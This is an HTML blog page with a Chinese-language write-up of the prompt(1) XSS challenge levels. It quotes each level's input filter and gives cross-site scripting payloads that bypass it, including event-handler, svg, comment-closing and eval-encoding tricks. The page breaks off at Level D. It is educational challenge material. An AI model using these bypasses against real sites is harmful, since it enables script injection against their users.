@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      prompt(1) writeup | HeartSky&#39;s blog 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="HeartSky">
+    
+    
+
+    <meta name="description" content="这个系列题目是关于XSS的，借此机会复习一下《XSS攻击剖析与防御》这本书上的知识  Level 0 题目12345function escape(input) &amp;#123;    // warm up    // script should be executed without user interaction    return &apos;&amp;lt;input type=&quot;text&quot; value=&quot;&apos;">
+<meta name="keywords" content="XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="prompt(1) writeup | HeartSky&#39;s blog">
+<meta property="og:url" content="http://heartsky.info/2016/07/11/prompt-1-writeup/index.html">
+<meta property="og:site_name" content="HeartSky&#39;s blog">
+<meta property="og:description" content="这个系列题目是关于XSS的，借此机会复习一下《XSS攻击剖析与防御》这本书上的知识  Level 0 题目12345function escape(input) &amp;#123;    // warm up    // script should be executed without user interaction    return &apos;&amp;lt;input type=&quot;text&quot; value=&quot;&apos;">
+<meta property="og:updated_time" content="2017-11-15T06:18:36.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="prompt(1) writeup | HeartSky&#39;s blog">
+<meta name="twitter:description" content="这个系列题目是关于XSS的，借此机会复习一下《XSS攻击剖析与防御》这本书上的知识  Level 0 题目12345function escape(input) &amp;#123;    // warm up    // script should be executed without user interaction    return &apos;&amp;lt;input type=&quot;text&quot; value=&quot;&apos;">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">HeartSky&#39;s blog</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          在渗透之路上渐行渐远
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/friends" title="" class="">友链</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">prompt(1) writeup</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2016-07-11" class="post-meta__date date">2016-07-11</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/XSS/">XSS</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <p>这个系列题目是关于XSS的，借此机会复习一下《XSS攻击剖析与防御》这本书上的知识</p>
+<hr>
+<h3 id="Level-0"><a href="#Level-0" class="headerlink" title="Level 0"></a>Level 0</h3><hr>
+<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// warm up</span></span><br><span class="line">    <span class="comment">// script should be executed without user interaction</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input type="text" value="'</span> + input + <span class="string">'"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">" onfocus=javascript:prompt(1) autofocus&gt;</span></span><br></pre></td></tr></table></figure>
+<p>闭合属性后，采用onfocus事件JavaScript伪协议的方法，最后加上autofocus让它自动弹窗</p>
+<p>或者<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;svg onload=prompt(1)&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>当然，因为这题没做任何过滤，所以有很多种方法可以弹窗</p>
+<h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><hr>
+<h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// tags stripping mechanism from ExtJS library</span></span><br><span class="line">    <span class="comment">// Ext.util.Format.stripTags</span></span><br><span class="line">    <span class="keyword">var</span> stripTagsRE = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span>;</span><br><span class="line">    input = input.replace(stripTagsRE, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;article&gt;'</span> + input + <span class="string">'&lt;/article&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="答案-1"><a href="#答案-1" class="headerlink" title="答案"></a>答案</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=prompt(<span class="number">1</span>)<span class="comment">//</span></span><br></pre></td></tr></table></figure>
+<p>过滤了<code>&lt;任意字符&gt;</code>，可对<code>&lt;</code>进行HTML编码，但一直没有成功闭合article标签，不知道为什么。看了下大神的，其实只要不出现<code>&gt;</code>就可以绕过，这里注意后面要加<code>//</code>才能通过，这样直接把article闭合标签注释掉了</p>
+<p>想了下，这样也可以<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=prompt(<span class="number">1</span>)<span class="comment">//</span></span><br></pre></td></tr></table></figure></p>
+<p>所以在html中，标签不闭合其实也能生效</p>
+<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><hr>
+<h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//                      v-- frowny face</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[=(]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ok seriously, disallows equal signs and open parenthesis</span></span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="答案-2"><a href="#答案-2" class="headerlink" title="答案"></a>答案</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt&amp;#40;1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>过滤了<code>=</code>和<code>（</code>，这时肯定要考虑编码了，因为HTML标签中属性名和属性值之间的<code>=</code>编码后不能被自动解码(HTML实体编码出现在属性值中可以被自动解码)，所以这里不能出现<code>=</code>，用<code>script</code>标签，并包含在svg向量里面，这样会先进行xml解析，使得<code>$#40;</code>变成<code>(</code></p>
+<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><hr>
+<h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential comment end delimiters</span></span><br><span class="line">    input = input.replace(<span class="regexp">/-&gt;/g</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// comment the input to avoid script execution</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="答案-3"><a href="#答案-3" class="headerlink" title="答案"></a>答案</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>过滤了<code>-&gt;</code>，这里有个小姿势，在HTML5中不仅可以用<code>--&gt;</code>来闭合注释，还可以用<code>--!&gt;</code></p>
+<h3 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h3><hr>
+<h4 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// make sure the script belongs to own site</span></span><br><span class="line">    <span class="comment">// sample script: http://prompt.ml/js/test.js</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^(?:https?:)?\/\/prompt\.ml\//i</span>.test(<span class="built_in">decodeURIComponent</span>(input))) &#123;</span><br><span class="line">        <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">        script.src = input;</span><br><span class="line">        <span class="keyword">return</span> script.outerHTML;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid resource.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="答案-4"><a href="#答案-4" class="headerlink" title="答案"></a>答案</h4><p>不会 = =</p>
+<h3 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h3><hr>
+<h4 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// apply strict filter rules of level 0</span></span><br><span class="line">    <span class="comment">// filter "&gt;" and event handlers</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&gt;|on.+?=|focus/gi</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input value="'</span> + input + <span class="string">'" type="text"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="答案-5"><a href="#答案-5" class="headerlink" title="答案"></a>答案</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">" type="</span>image<span class="string">" src=1 onerror</span></span><br><span class="line"><span class="string">="</span>prompt(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p>过滤了<code>&gt;</code>，<code>focus</code>和<code>onxxx=</code>，因为<strong><code>input</code>标签中只有第一个<code>type</code>会生效</strong>，所以尽管过滤了onfocus，仍可以把type改成image来使用我们熟悉的onerror</p>
+<h3 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h3><hr>
+<h4 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// let's do a post redirection</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in formURL#formDataJSON</span></span><br><span class="line">        <span class="comment">// e.g. http://httpbin.org/post#&#123;"name":"Matt"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">        <span class="keyword">var</span> formURL = segments[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> formData = <span class="built_in">JSON</span>.parse(segments[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> form = <span class="built_in">document</span>.createElement(<span class="string">'form'</span>);</span><br><span class="line">        form.action = formURL;</span><br><span class="line">        form.method = <span class="string">'post'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> formData) &#123;</span><br><span class="line">            <span class="keyword">var</span> input = form.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'input'</span>));</span><br><span class="line">            input.name = i;</span><br><span class="line">            input.setAttribute(<span class="string">'value'</span>, formData[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> form.outerHTML + <span class="string">'                         \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                                  \n\</span></span><br><span class="line"><span class="string">    // forbid javascript: or vbscript: and data: stuff    \n\</span></span><br><span class="line"><span class="string">    if (!/script:|data:/i.test(document.forms[0].action)) \n\</span></span><br><span class="line"><span class="string">        document.forms[0].submit();                       \n\</span></span><br><span class="line"><span class="string">    else                                                  \n\</span></span><br><span class="line"><span class="string">        document.write("Action forbidden.")               \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt;                                                 \n\</span></span><br><span class="line"><span class="string">        '</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid form data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="答案-6"><a href="#答案-6" class="headerlink" title="答案"></a>答案</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:prompt(1)#&#123;"action":1&#125;</span><br></pre></td></tr></table></figure>
+<p>在表单的action属性中过滤了<code>javascript:</code>和<code>data:</code>，但问题在于这个过滤检测的是<code>documents.forms[0].action</code>，如果这个表单中有一个叫做action的input标签，那么检测的就是这个标签元素<br>这题自己没想出来，还是对DOM不太熟悉</p>
+<h3 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h3><hr>
+<h4 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 12 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">12</span>) + <span class="string">'"&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="答案-7"><a href="#答案-7" class="headerlink" title="答案"></a>答案</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;script&gt;/*#*/prompt(1/*#*/)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>利用JS注释<code>/**/</code>来组合成一串</p>
+<h3 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h3><hr>
+<h4 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// prevent input from getting out of comment</span></span><br><span class="line">    <span class="comment">// strip off line-breaks and stuff</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\r\n&lt;/"]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    // console.log("'</span> + input + <span class="string">'");        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="答案-8"><a href="#答案-8" class="headerlink" title="答案"></a>答案</h4><p>真不会</p>
+<h3 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h3><hr>
+<h4 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential start-tags</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">'&lt;_$1'</span>);</span><br><span class="line">    <span class="comment">// use all-caps for heading</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>替换掉了<code>&lt;字母</code>，并把输入转为大写<br>这题学长说可以跳过，作者给的答案也有问题</p>
+<h3 id="Level-A"><a href="#Level-A" class="headerlink" title="Level A"></a>Level A</h3><hr>
+<h4 id="题目-10"><a href="#题目-10" class="headerlink" title="题目"></a>题目</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ ┻━┻</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</span><br><span class="line">    <span class="comment">// ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro</span></span><br><span class="line">    input = input.replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="答案-9"><a href="#答案-9" class="headerlink" title="答案"></a>答案</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prom<span class="string">'pt(1)</span></span><br></pre></td></tr></table></figure>
+<p>巧妙地利用了题目</p>
+<h3 id="Level-B"><a href="#Level-B" class="headerlink" title="Level B"></a>Level B</h3><hr>
+<h4 id="题目-11"><a href="#题目-11" class="headerlink" title="题目"></a>题目</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// name should not contain special characters</span></span><br><span class="line">    <span class="keyword">var</span> memberName = input.replace(<span class="regexp">/[[|\s+*/\\&lt;&gt;&amp;^:;=~!%-]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// data to be parsed as JSON</span></span><br><span class="line">    <span class="keyword">var</span> dataString = <span class="string">'&#123;"action":"login","message":"Welcome back, '</span> + memberName + <span class="string">'."&#125;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// directly "parse" data in script context</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    var data = '</span> + dataString + <span class="string">';          \n\</span></span><br><span class="line"><span class="string">    if (data.action === "login")            \n\</span></span><br><span class="line"><span class="string">        document.write(data.message)        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="答案-10"><a href="#答案-10" class="headerlink" title="答案"></a>答案</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">" (prompt(1)) in "</span></span><br></pre></td></tr></table></figure>
+<p>可以看出没过滤双引号，所以可以先把双引号闭合，后面可以用<code>in</code>操作符，虽然会提示语法错误，但<code>prompt(1)</code>依旧可以执行，至于外面加圆括号是因为前面有字符串</p>
+<h3 id="Level-C"><a href="#Level-C" class="headerlink" title="Level C"></a>Level C</h3><hr>
+<h4 id="题目-12"><a href="#题目-12" class="headerlink" title="题目"></a>题目</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// in Soviet Russia...</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// table flips you!</span></span><br><span class="line">    input = input.replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ノ┬─┬ノ ︵ ( \o°o)\</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="答案-11"><a href="#答案-11" class="headerlink" title="答案"></a>答案</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>((<span class="number">1558153217</span>).toString(<span class="number">36</span>))(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p>与Level A不同的是先过滤单引号，再替换prompt，所以不能再用上面的办法了，考虑通过<code>eval</code>执行字符串，而<code>\</code>和<code>,</code>均被编码，只能先把prompt转换为36进制(不必是36，只要要转换的字符串能用此进制表示就行)的数字(比如这题中的1558153217)，再转回原来的字符串，这样就绕过了特殊字符</p>
+<h3 id="Level-D"><a href="#Level-D" class="headerlink" title="Level D"></a>Level D</h3><hr>
+<h4 id="题目-13"><a href="#题目-13" class="headerlink" title="题目"></a>题目</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// extend method from Underscore library</span></span><br><span class="line">    <span class="comment">// _.extend(destination, *sources) </span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">extend</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> source, prop;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>, length = <span 